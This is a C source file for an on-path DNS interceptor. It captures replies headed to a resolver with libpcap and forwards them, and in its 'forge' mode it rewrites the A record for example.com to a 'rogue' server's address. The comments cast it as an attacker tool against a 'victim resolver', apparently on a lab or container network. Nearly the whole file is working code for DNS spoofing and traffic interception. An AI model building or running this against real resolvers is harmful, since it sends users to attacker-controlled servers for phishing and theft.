/*
 * On-path DNS interceptor for the resolver subnet.
 *
 * The core-router is told to send every reply bound for the resolver
 * (172.16.2.10) to us first. The kernel does not forward those packets
 * (ip_forward is 0), so this program is the only thing that passes them on:
 * it captures each reply with libpcap and re-injects it toward the resolver.
 *
 *   relay mode : every reply is forwarded unchanged (transparent).
 *   forge mode : replies that answer "example.com A" have their address
 *                rewritten to the rogue server; everything else is unchanged.
 *
 * Because we sit on the path we can read the genuine reply, so we already
 * know the transaction id, the resolver's query port and the question. We
 * just hand the resolver the same packet with a different answer, and it is
 * accepted as the real one.
 *
 * Build:  gcc -O2 -Wall -o interceptor interceptor.c -lpcap
 * Run:    ./interceptor relay   eth0
 *         ./interceptor forge   eth0
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/sockios.h>

#define ETH_HLEN       14
#define ETHERTYPE_IP4  0x0800
#define ETHERTYPE_ARP  0x0806

static const char *TARGET_NAME = "example.com";
static const char *ROGUE_IP    = "172.16.1.30";   /* rogue-web */
static const char *RESOLVER_IP = "172.16.2.10";   /* victim resolver */
static const char *MY_IP       = "172.16.2.100";  /* this attacker */

/* ---- checksums ---------------------------------------------------------- */

/* Recompute the IPv4 header checksum in place. Needed because packets handed
   between containers often carry uncomputed (offloaded) checksums, which the
   resolver would otherwise reject once we re-inject them. */
static void fix_ip_checksum(uint8_t *iph, int ihl)
{
    iph[10] = iph[11] = 0;
    uint32_t sum = 0;
    for (int i = 0; i + 1 < ihl; i += 2)
        sum += (iph[i] << 8) | iph[i + 1];
    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);
    uint16_t c = (uint16_t)~sum;
    iph[10] = c >> 8;
    iph[11] = c & 0xff;
}

/* UDP checksum over the IPv4 pseudo-header + UDP header + data.
   The UDP checksum field must be zeroed before calling. */
static uint16_t udp_checksum(const uint8_t *ipsrc, const uint8_t *ipdst,
                             const uint8_t *udp, int udplen)
{
    uint32_t sum = 0;
    sum += (ipsrc[0] << 8) | ipsrc[1];
    sum += (ipsrc[2] << 8) | ipsrc[3];
    sum += (ipdst[0] << 8) | ipdst[1];
    sum += (ipdst[2] << 8) | ipdst[3];
    sum += 17;                      /* protocol = UDP */
    sum += udplen;
    for (int i = 0; i + 1 < udplen; i += 2)
        sum += (udp[i] << 8) | udp[i + 1];
    if (udplen & 1)
        sum += udp[udplen - 1] << 8;
    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);
    uint16_t c = (uint16_t)~sum;
    return c == 0 ? 0xffff : c;
}

/* ---- DNS parsing -------------------------------------------------------- */

/* Return 1 if the question is exactly `want` with the given type. The
   question name is never compressed, so plain label walking is enough. */
static int question_is(const uint8_t *dns, int dnslen,
                       const char *want, uint16_t want_type)
{
    if (dnslen < 12 || ((dns[4] << 8) | dns[5]) < 1)
        return 0;

    char name[256];
    int n = 0, p = 12;
    while (p < dnslen && dns[p] != 0) {
        int len = dns[p++];
        if (len & 0xc0) return 0;
        if (p + len > dnslen || n + len + 1 >= (int)sizeof(name)) return 0;
        for (int i = 0; i < len; i++) name[n++] = dns[p++];
        name[n++] = '.';
    }
    if (n > 0) n--;                 /* drop trailing dot */
    name[n] = 0;
    p++;                            /* skip the root label */
    if (p + 4 > dnslen) return 0;

    uint16_t qtype = (dns[p] << 8) | dns[p + 1];
    if ((int)strlen(want) != n) return 0;
    for (int i = 0; i < n; i++) {
        char a = name[i], b = want[i];
        if (a >= 'A' && a <= 'Z') a += 32;
        if (b >= 'A' && b <= 'Z') b += 32;
        if (a != b) return 0;
    }
    return qtype == want_type;
}

/* Offset just past the question section (-1 on error). */
static int skip_question(const uint8_t *dns, int dnslen)
{
    int p = 12;
    while (p < dnslen && dns[p] != 0) {
        if (dns[p] & 0xc0) { p += 2; return (p + 4 <= dnslen) ? p + 4 : -1; }
        p += dns[p] + 1;
    }
    p += 1 + 4;                     /* root label + qtype + qclass */
    return p <= dnslen ? p : -1;
}

/* Skip a (possibly compressed) RR owner name. */
static int skip_name(const uint8_t *dns, int dnslen, int p)
{
    while (p < dnslen) {
        uint8_t len = dns[p];
        if (len == 0)       return p + 1;
        if (len & 0xc0)     return p + 2;   /* compression pointer */
        p += len + 1;
    }
    return -1;
}

/* Overwrite every A record in the ANSWER section with rogue_be (network
   order). Returns how many records were changed. */
static int forge_answers(uint8_t *dns, int dnslen, uint32_t rogue_be)
{
    int an = (dns[6] << 8) | dns[7];
    int p = skip_question(dns, dnslen);
    if (p < 0) return 0;

    int changed = 0;
    for (int i = 0; i < an; i++) {
        p = skip_name(dns, dnslen, p);
        if (p < 0 || p + 10 > dnslen) break;
        uint16_t type  = (dns[p] << 8) | dns[p + 1];
        uint16_t rdlen = (dns[p + 8] << 8) | dns[p + 9];
        int rdata = p + 10;
        if (rdata + rdlen > dnslen) break;
        if (type == 1 && rdlen == 4) {          /* A record */
            memcpy(dns + rdata, &rogue_be, 4);
            changed++;
        }
        p = rdata + rdlen;
    }
    return changed;
}

/* ---- link-layer helpers ------------------------------------------------- */

static int get_if_mac(const char *ifname, uint8_t *out)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) { close(fd); return -1; }
    memcpy(out, ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
    return 0;
}

/* Learn a neighbour's MAC with a normal ARP request/reply, using pcap for
   both the send and the receive. */
static int arp_resolve(pcap_t *h, const uint8_t *mymac,
                       const char *myip, const char *targetip, uint8_t *out)
{
    uint8_t spa[4], tpa[4];
    inet_pton(AF_INET, myip, spa);
    inet_pton(AF_INET, targetip, tpa);

    uint8_t req[42];
    memset(req, 0, sizeof(req));
    memset(req, 0xff, 6);                 /* dst: broadcast */
    memcpy(req + 6, mymac, 6);            /* src */
    req[12] = 0x08; req[13] = 0x06;       /* ethertype ARP */
    req[14] = 0x00; req[15] = 0x01;       /* hw type ethernet */
    req[16] = 0x08; req[17] = 0x00;       /* proto type IPv4 */
    req[18] = 6;    req[19] = 4;          /* hw/proto length */
    req[20] = 0x00; req[21] = 0x01;       /* op: request */
    memcpy(req + 22, mymac, 6);
    memcpy(req + 28, spa, 4);
    memcpy(req + 38, tpa, 4);

    struct bpf_program fp;
    if (pcap_compile(h, &fp, "arp", 1, PCAP_NETMASK_UNKNOWN) == 0) {
        pcap_setfilter(h, &fp);
        pcap_freecode(&fp);
    }

    for (int tries = 0; tries < 40; tries++) {
        pcap_inject(h, req, sizeof(req));
        for (int k = 0; k < 50; k++) {
            struct pcap_pkthdr *hdr;
            const uint8_t *d;
            int r = pcap_next_ex(h, &hdr, &d);
            if (r == 0) break;                     /* read timeout, re-send */
            if (r != 1 || hdr->caplen < 42) continue;
            if (d[12] != 0x08 || d[13] != 0x06) continue;
            if (((d[20] << 8) | d[21]) == 2 && memcmp(d + 28, tpa, 4) == 0) {
                memcpy(out, d + 22, 6);            /* sender hardware address */
                return 0;
            }
        }
    }
    return -1;
}

/* ---- main --------------------------------------------------------------- */

int main(int argc, char **argv)
{
    const char *mode   = argc > 1 ? argv[1] : "relay";
    const char *ifname = argc > 2 ? argv[2] : "eth0";
    int forge = (strcmp(mode, "forge") == 0);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *h = pcap_open_live(ifname, 65535, 1, 100, errbuf);
    if (!h) { fprintf(stderr, "pcap_open_live: %s\n", errbuf); return 1; }
    if (pcap_datalink(h) != DLT_EN10MB) {
        fprintf(stderr, "interface is not ethernet\n"); return 1;
    }
    pcap_setdirection(h, PCAP_D_IN);    /* ignore our own injected frames */

    uint8_t mymac[6], resolver_mac[6];
    if (get_if_mac(ifname, mymac) != 0) {
        fprintf(stderr, "could not read %s MAC\n", ifname); return 1;
    }
    if (arp_resolve(h, mymac, MY_IP, RESOLVER_IP, resolver_mac) != 0) {
        fprintf(stderr, "could not ARP-resolve %s\n", RESOLVER_IP); return 1;
    }

    char filter[128];
    snprintf(filter, sizeof(filter), "ip dst host %s", RESOLVER_IP);
    struct bpf_program fp;
    if (pcap_compile(h, &fp, filter, 1, PCAP_NETMASK_UNKNOWN) != 0) {
        fprintf(stderr, "filter compile failed\n"); return 1;
    }
    pcap_setfilter(h, &fp);
    pcap_freecode(&fp);

    uint32_t rogue_be;
    inet_pton(AF_INET, ROGUE_IP, &rogue_be);

    printf("[interceptor] mode=%s iface=%s  -> relaying to resolver %s\n",
           mode, ifname, RESOLVER_IP);
    if (forge)
        printf("[interceptor] forging: %s A  ->  %s\n", TARGET_NAME, ROGUE_IP);
    fflush(stdout);

    static uint8_t buf[65536];
    while (1) {
        struct pcap_pkthdr *hdr;
        const uint8_t *data;
        int r = pcap_next_ex(h, &hdr, &data);
        if (r == 0) continue;
        if (r < 0) break;

        int len = hdr->caplen;
        if (len < ETH_HLEN + 20 || len > (int)sizeof(buf)) continue;
        if (memcmp(data + 6, mymac, 6) == 0) continue;          /* our own */
        if (((data[12] << 8) | data[13]) != ETHERTYPE_IP4) continue;

        memcpy(buf, data, len);
        uint8_t *ip  = buf + ETH_HLEN;
        int ihl      = (ip[0] & 0x0f) * 4;
        uint8_t proto = ip[9];

        const char *tag = "relay";
        if (proto == 17) {                                      /* UDP */
            uint8_t *udp = ip + ihl;
            int udplen = (udp[4] << 8) | udp[5];
            if (ETH_HLEN + ihl + udplen <= len && udplen >= 8) {
                uint8_t *dns = udp + 8;
                int dnslen = udplen - 8;
                if (forge && ((udp[0] << 8) | udp[1]) == 53 &&  /* src port 53 */
                    dnslen > 0 &&
                    question_is(dns, dnslen, TARGET_NAME, 1) &&
                    forge_answers(dns, dnslen, rogue_be) > 0) {
                    tag = "FORGED";
                }
                /* Always recompute the UDP checksum: the captured one may be an
                   uncomputed offload placeholder, and in forge mode the data
                   changed. */
                udp[6] = udp[7] = 0;
                uint16_t c = udp_checksum(ip + 12, ip + 16, udp, udplen);
                udp[6] = c >> 8;
                udp[7] = c & 0xff;
            }
        }
        fix_ip_checksum(ip, ihl);

        /* send the frame on to the resolver */
        memcpy(buf, resolver_mac, 6);
        memcpy(buf + 6, mymac, 6);
        if (pcap_inject(h, buf, len) >= 0) {
            printf("[%s] %d bytes -> %s\n", tag, len, RESOLVER_IP);
            fflush(stdout);
        }
    }

    pcap_close(h);
    return 0;
}
